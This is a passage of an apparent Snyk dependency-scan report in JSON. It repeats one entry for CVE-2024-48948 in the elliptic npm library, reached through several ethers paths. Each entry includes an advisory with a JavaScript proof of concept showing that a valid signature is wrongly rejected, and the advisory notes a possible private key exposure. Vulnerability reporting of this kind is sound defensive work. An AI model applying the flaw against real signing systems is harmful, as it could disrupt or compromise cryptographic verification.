          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/providers@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar 